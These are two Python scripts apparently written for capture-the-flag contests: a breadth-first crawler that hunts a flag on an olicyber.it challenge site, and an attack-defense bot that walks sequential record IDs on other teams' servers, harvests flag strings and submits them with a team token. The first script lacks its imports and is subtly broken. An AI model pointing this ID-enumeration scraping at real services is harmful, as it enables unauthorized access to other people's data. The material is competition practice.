```python
from collections import deque

def bfsSearch(url, queue, visited):
    page = req.get(url).text
    soup = BeautifulSoup(page, 'html.parser')

    if 'flag' in soup.find('h1').text:
        print(soup.find('h1').text)
        return
    
    for link in soup.find_all('a'):
        href = link.get('href')
        if href not in visited:
            queue.append(href)

    next = 'http://web-16.challs.olicyber.it' + queue.popleft()
    visited.add(next)
    bfsSearch(next, queue, visited)

   
url = 'http://web-16.challs.olicyber.it'
bfsSearch(url, deque(), set())
```

```python
import re
import requests as req
from bs4 import BeautifulSoup

s = req.Session()
res = s.get('http://10.10.0.1:8081/')

ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
urls = re.findall(ip_pattern, res.text)

flag_regex = '^[A-Z0-9]{31}=$'
token = 'dd56fc2819c8daf457bf02227163b5cb'

flags = []
curr_id = {}
last_found = {}

init_id = 550
for url in urls:
    curr_id[url] = init_id
    last_found[url] = init_id

print('mining flags!')
while True:
    for url in urls: 
        try:
            res = s.get('http://' + url + ':8080/view/' + str(curr_id[url]))
            soup = BeautifulSoup(res.text, 'html.parser')

            if res.status_code == 404:
                curr_id[url] = last_found[url]
            else: 
                last_found[url] = curr_id[url]
                curr_id[url] += 1

            for parag in soup.find_all('p'):
                if parag.text[-1] == '=' and re.search(flag_regex, parag.text):
                    flags.append(parag.text)
        except:
            pass
            
    if len(flags) > 0:
        #print(flags)
        res = s.put('http://10.10.0.1:8080/flags', headers={'X-Team-Token': token}, json=flags)
        print(res.text)
        flags = []
        print(f'found {res.text.count("true")} flags!')
```
